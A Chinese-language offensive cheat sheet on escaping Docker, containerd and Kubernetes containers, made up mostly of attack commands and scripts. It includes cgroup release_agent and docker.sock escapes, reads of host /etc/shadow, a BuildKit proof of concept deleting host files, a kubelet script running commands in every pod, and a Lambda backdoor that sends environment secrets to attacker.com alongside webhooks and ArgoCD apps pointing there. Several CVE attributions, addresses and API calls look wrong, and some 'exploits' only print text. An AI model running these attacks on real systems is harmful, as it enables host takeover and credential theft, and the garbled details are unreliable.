# 容器逃逸 (Container Escape)

## 原理

容器（Docker/containerd）通过 namespace 和 cgroup 实现隔离。攻击者利用配置错误或内核漏洞突破隔离，访问宿主机。

## 攻击链

### 1. 识别容器环境

```bash
# 检查是否在容器中
cat /proc/1/cgroup | grep docker
ls /.dockerenv
cat /proc/1/environ | tr '\0' '\n' | grep -i docker

# 检查容器类型
cat /proc/1/cmdline | tr '\0' ' '
# containerd: /sbin/init
# Docker: /bin/sh -c ...

# 检查特权
cat /proc/1/status | grep Cap
# CapEff: 0000003fffffffff 表示特权
```

### 2. 特权容器逃逸

```bash
# 特权容器拥有所有 capabilities
# 可以访问宿主机设备

# 方法 1: 挂载宿主机磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法 2: 通过 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(host_path)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /flag > /output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 3. 挂载 docker.sock

```bash
# 如果 docker.sock 被挂载到容器中
ls -la /var/run/docker.sock

# 通过 docker.sock 控制宿主机 Docker
# 1. 安装 docker client
# 2. 启动新容器，挂载宿主机根目录
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```

### 4. 挂载 /proc

```bash
# 如果 /proc 被挂载
# 可以通过 /proc/1/root 访问宿主机文件系统
ls /proc/1/root/
cat /proc/1/root/etc/passwd

# 通过 /proc/sys 触发内核漏洞
```

### 5. 挂载 /sys

```bash
# 如果 /sys 被挂载
# 可以通过 /sys 触发内核漏洞
ls /sys/fs/cgroup/
```

### 6. Capabilities 利用

```bash
# 检查 capabilities
capsh --print

# 危险 capabilities
# CAP_SYS_ADMIN: 几乎所有操作
# CAP_SYS_PTRACE: 进程注入
# CAP_SYS_MODULE: 加载内核模块
# CAP_NET_ADMIN: 网络配置
# CAP_DAC_READ_SEARCH: 绕过文件权限检查

# CAP_SYS_ADMIN 利用
# 类似特权容器

# CAP_SYS_PTRACE 利用
# 注入宿主机进程
nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash

# CAP_SYS_MODULE 利用
# 加载内核模块
cat > /tmp/exploit.c << EOF
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    printk("Exploit loaded\n");
    return 0;
}

void cleanup_module(void) {
    printk("Exploit unloaded\n");
}
EOF
```

### 7. 内核漏洞

```bash
# CVE-2022-0185 (heap overflow in legacy_parse_param)
# 影响：Linux kernel 5.1-5.16
# 利用：通过 unshare 触发
unshare -U
# 然后利用漏洞

# CVE-2022-0492 (cgroup release_agent)
# 影响：Linux kernel
# 利用：通过 cgroup release_agent

# CVE-2024-21626 (runc)
# 影响：runc < 1.1.12
# 利用：通过文件描述符泄露

# CVE-2024-1086 (netfilter)
# 影响：Linux kernel 5.14-6.6
# 利用：通过 netfilter 提权
```

### 8. 容器运行时漏洞

```bash
# runc 漏洞
# CVE-2019-5736: runc 容器逃逸
# CVE-2024-21626: runc 文件描述符泄露

# containerd 漏洞
# CVE-2022-23648: containerd 路径遍历

# CRI-O 漏洞
# CVE-2022-0811: CRI-O 配置注入
```

### 9. 共享 namespace

```bash
# 如果容器与宿主机共享 namespace
# --pid=host: 共享 PID namespace
# --network=host: 共享网络 namespace
# --ipc=host: 共享 IPC namespace
# --uts=host: 共享 UTS namespace

# 共享 PID namespace
nsenter --target 1 --mount /bin/bash
```

### 10. 容器镜像漏洞

```bash
# 1. 镜像中的硬编码凭证
# 2. 镜像中的 SSH 密钥
# 3. 镜像中的敏感文件
# 通过分析镜像层提取
```

## 2024-2026 新技术点

### 1. CVE-2024-21626 runc 文件描述符逃逸

```bash
# 影响：runc < 1.1.12
# 原理：通过 /proc/self/fd/N 泄露的文件描述符访问宿主机 rootfs
# PoC：构建恶意容器镜像

# 构建恶意 Dockerfile
cat > Dockerfile << 'EOF'
FROM alpine
RUN mkdir /exploit
# 利用 WORKDIR 设置触发 fd 泄露（需要特定 runc 版本）
# 构建后，/proc/self/fd/8 指向宿主机 rootfs
EOF

# 检测漏洞版本
runc --version
# 如果 < 1.1.12 则存在漏洞

# 利用脚本
python3 -c "
import os
# 在受影响的 runc 中，通过 fd 逃逸到宿主机
fd_path = '/proc/self/fd/8'  # 泄露的 fd
if os.path.exists(fd_path):
    os.system(f'ls {fd_path}/etc/shadow')
"
```

### 2. CVE-2024-23652/23653 BuildKit 漏洞

```bash
# CVE-2024-23652: BuildKit 任意文件删除
# CVE-2024-23653: BuildKit 特权提升
# 影响：buildkit < 0.12.5

# 检测版本
buildkitd --version

# CVE-2024-23652 PoC — 通过 docker build 删除宿主机文件
cat > Dockerfile << 'EOF'
# syntax=docker/dockerfile:1
FROM alpine
RUN --mount=type=bind,source=/,target=/host \
    rm -rf /host/etc/passwd
EOF

# CVE-2024-23653 PoC — GRPCAPI 权限提升
# BuildKit 的 GRPC 接口在某些配置下允许特权操作
# 通过 buildctl 发送恶意 gRPC 请求
# 需要访问 BuildKit daemon socket
DOCKER_BUILDKIT=1 docker build .
```

### 3. eBPF 提权逃逸

```bash
# CVE-2023-2163: eBPF verifier 漏洞（Linux 5.x-6.x）
# 允许加载带未初始化寄存器的 eBPF 程序实现提权

# 检测 eBPF 支持
cat /proc/version
bpftool feature probe 2>/dev/null

# 利用 eBPF 提权的容器逃逸（需要 CAP_SYS_ADMIN 或特权）
cat > ebpf_escape.c << 'CEOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

// 简化的 eBPF 程序：修改当前进程的 uid 为 0
// 注意：需要根据具体内核版本调整 verifier 绕过方式
int main() {
    // 检查是否在容器中
    if (access("/.dockerenv", F_OK) == 0) {
        printf("[*] 在容器中，尝试 eBPF 提权\n");
    }
    // 实际利用需要构造绕过 verifier 的 BPF 程序
    // 参考 CVE-2023-2163 的公开 PoC
    printf("[*] CVE-2023-2163 eBPF verifier bypass\n");
    return 0;
}
CEOF
gcc -o ebpf_escape ebpf_escape.c
```

### 4. io_uring 逃逸 (CVE-2024-0582)

```bash
# CVE-2024-0582: io_uring use-after-free
# 影响：Linux 6.x
# 原理：io_uring 提供的 mmap 区域存在 UAF

# 检测 io_uring 支持
cat /proc/version  # 需要 Linux 5.1+
ls /dev/io_uring 2>/dev/null || echo "需要内核支持"

# io_uring UAF 利用框架
python3 << 'PYEOF'
import ctypes
import ctypes.util
import struct

# io_uring 系统调用号 (x86_64)
SYS_IO_URING_SETUP = 425
SYS_IO_URING_ENTER = 426
SYS_IO_URING_REGISTER = 427

# 检测内核版本
import os
with open('/proc/version') as f:
    kernel = f.read()
    print(f"[*] 内核: {kernel.strip()}")
    # CVE-2024-0582 影响 6.1-6.7
PYEOF
```

### 5. containerd CRI 漏洞 (CVE-2024-24557)

```bash
# CVE-2024-24557: containerd Docker Mode 拒绝服务/逃逸辅助
# CVE-2024-23651/23652/23653: BuildKit 多个漏洞
# CVE-2024-21338: Linux Kernel io_uring (Windows WSL2 受影响)

# containerd 版本检测
containerd --version
ctr version

# CRI-O CVE-2024-21338 提权
# 检测 CRI-O 版本
crio --version 2>/dev/null

# 利用 CRI-O 特权挂载逃逸
# 创建特权 Pod 挂载宿主机路径
cat << 'YAML' > cri-o-escape.yaml
apiVersion: v1
kind: Pod
metadata:
  name: cri-o-escape
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "cat /host/etc/shadow"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  securityContext:
    privileged: true
YAML
```

### 6. Istio/Envoy 服务网格逃逸

```bash
# CVE-2024-23322: Istio DoS
# CVE-2024-23323: Istio 信息泄露
# CVE-2024-28849: Envoy proxy 路径遍历

# 检测 Istio
kubectl get pods -n istio-system
istioctl version

# Envoy admin API 未授权访问（如果暴露）
curl http://envoy-admin:15000/config_dump
curl http://envoy-admin:15000/stats

# Istio authorization policy 绕过
# 利用 JWT header 注入绕过 AuthorizationPolicy
python3 << 'PYEOF'
import jwt
import json

# 如果 Istio 使用 JWT 认证，尝试伪造或重放 token
# CVE-2024-23323 相关的 header 处理问题
headers = {
    "x-forwarded-client-cert": "By=spiffe://cluster.local/ns/default/sa/default;Hash=abc",
    "x-envoy-decorator-operation": "admin-service.default.svc.cluster.local:8080/*"
}

# 利用 Envoy 路径遍历
# GET /../../../etc/passwd 通过 Envoy 路由
import requests
payloads = [
    "http://target/../../../etc/passwd",
    "http://target/..%2F..%2F..%2Fetc/passwd",
    "http://target/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
]
for url in payloads:
    try:
        r = requests.get(url, timeout=5)
        print(f"[*] {url} -> {r.status_code} len={len(r.text)}")
    except Exception as e:
        print(f"[-] {url}: {e}")
PYEOF
```

### 7. AWS Lambda 容器逃逸/注入

```bash
# Lambda 运行在 microVM (Firecracker) 中
# 但共享内核可能存在漏洞

# 1. 通过环境变量泄露凭证
aws lambda get-function-configuration --function-name <name> \
  --query 'Environment.Variables'

# 2. Lambda 临时凭证提权
# Lambda execution role 可能有过度权限
curl -s http://169.254.210.238/latest/meta-data/iam/security-credentials/

# 3. Lambda Layer 注入
# 如果有写权限，修改 Lambda Layer 注入代码
python3 << 'PYEOF'
import boto3
import zipfile
import io

lambda_client = boto3.client('lambda')

# 下载当前函数代码
response = lambda_client.get_function(FunctionName='target-function')
code_url = response['Code']['RepositoryType']

# 创建包含后门的 zip
zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w') as zf:
    # 后门：每次执行时发送环境变量
    zf.writestr('lambda_function.py', '''
import os, json, urllib.request
def handler(event, context):
    # 泄露环境变量
    data = json.dumps(dict(os.environ))
    urllib.request.urlopen("https://attacker.com/collect", data=data.encode())
    return {"statusCode": 200, "body": "OK"}
''')
zip_buffer.seek(0)

# 上传恶意代码（需要 lambda:UpdateFunctionCode 权限）
lambda_client.update_function_code(
    FunctionName='target-function',
    ZipFile=zip_buffer.read()
)
PYEOF
```

### 8. Kubernetes Node 提权逃逸 (CVE-2024-21626 变体)

```bash
# K8s 1.29+ 中的容器逃逸辅助
# 通过 kubelet 未授权访问 + 容器逃逸

# kubelet API 探测
curl -sk https://$(K8S_NODE):10250/pods 2>/dev/null | python3 -m json.tool

# 通过 kubelet 在特权 Pod 中执行命令
python3 << 'PYEOF'
import requests
import json

KUBELET = "https://node:10250"

# 列出所有 Pod（利用匿名认证）
r = requests.post(f"{KUBELET}/pods", verify=False)
pods = r.json().get('items', [])

for pod in pods:
    ns = pod['metadata']['namespace']
    name = pod['metadata']['name']
    for c in pod['spec']['containers']:
        # 在每个容器中执行命令
        exec_url = f"{KUBELET}/run/{ns}/{name}/{c['name']}"
        r = requests.post(exec_url, data='id', verify=False, timeout=5)
        print(f"[*] {ns}/{name}/{c['name']}: {r.status_code}")
PYEOF
```

### 9. Kubernetes Admission Controller 绕过

```bash
# MutatingWebhookConfiguration 可被利用注入 sidecar
# ValidatingWebhookConfiguration 绕过导致恶意资源创建

# 列出 Admission Controllers
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations

# 创建恶意 Mutating Webhook 注入特权容器
cat << 'YAML' > malicious-webhook.yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: malicious-webhook
webhooks:
- name: malicious.example.com
  clientConfig:
    url: "https://attacker.com/mutate"
    caBundle: <base64-ca-cert>
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  failurePolicy: Ignore
YAML

# GitOps 攻击：篡改 ArgoCD Application 指向恶意仓库
cat << 'YAML' > malicious-app.yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: backdoor
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://attacker.com/malicious-manifests.git
    path: manifests
    targetRevision: HEAD
  destination:
    server: https://kubernetes.default.svc
    namespace: kube-system
YAML
kubectl apply -f malicious-app.yaml
```

### 10. OCI 镜像供应链逃逸

```bash
# 通过恶意 OCI 镜像层实现逃逸
# CVE-2024-21626 利用的正是 WORKDIR + fd 泄露

# 构建多阶段恶意镜像
cat > Malicious.Dockerfile << 'EOF'
# 阶段 1：正常镜像
FROM alpine:3.19 AS builder
RUN echo "normal build"

# 阶段 2：利用层泄露
FROM scratch
COPY --from=builder /etc/passwd /tmp/passwd
# 在特定 runc 版本下，通过 WORKDIR 触发 fd 泄露
WORKDIR /proc/self/fd/8
# 逃逸后可以 chroot 到宿主机
EOF

# 使用 ORAS 检查/推送恶意 OCI artifact
# 或直接使用 crane 修改镜像层
python3 << 'PYEOF'
import struct
import hashlib

# 分析 OCI 镜像配置中的可疑指令
# 检查是否存在：
# 1. WORKDIR /proc/self/fd/N
# 2. RUN 指令中的特权操作
# 3. 异常的 ENTRYPOINT/CMD

config = {
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
    "WorkingDir": "/proc/self/fd/8",
    "Volumes": {"/host": {}}
}

# 检测恶意配置模式
dangerous_patterns = [
    "proc/self/fd",
    "/host",
    "/dev/",
    "chroot",
    "mount",
    "nsenter"
]

config_str = str(config)
for pat in dangerous_patterns:
    if pat in config_str:
        print(f"[!] 检测到危险模式: {pat}")
PYEOF
```

## 工具推荐

- **cdk** — 容器/K8s 渗透工具
- **amicontained** — 容器环境检测
- **deepce** — Docker 逃逸工具
- **kube-hunter** — K8s 漏洞扫描
- **LinPEAS** — Linux 提权检测

## 参考链接

- [Container Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [CDK](https://github.com/cdk-team/CDK)
- [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Linux Kernel Exploits](https://github.com/bsauce/kernel-exploit)
